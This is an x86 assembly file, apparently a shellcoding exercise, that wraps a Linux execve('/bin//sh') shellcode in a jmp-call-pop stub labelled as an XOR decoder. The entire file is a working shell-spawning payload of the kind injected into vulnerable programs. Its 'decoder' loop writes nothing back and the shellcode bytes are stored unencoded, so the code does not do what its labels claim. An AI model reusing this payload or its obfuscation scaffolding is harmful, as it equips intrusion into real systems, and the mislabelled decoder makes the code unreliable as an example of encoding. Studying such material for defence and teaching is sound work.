global _start

_start:
	jmp short xor_decoder


decoder:
	pop esi
	xor ecx,ecx
	xor ebx,ebx
	mov cl, 25
	
decoder_loop:
	xor bl,byte [esi]
	inc esi
	inc bl
	loop decoder_loop
	jmp short shellcode 
	

xor_decoder:
	call decoder
	shellcode: db 0x31,0xc9,0xf7,0xe1,0x51,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x51,0x53,0x89,0xe1,0xb0,0xb,0xcd,0x80
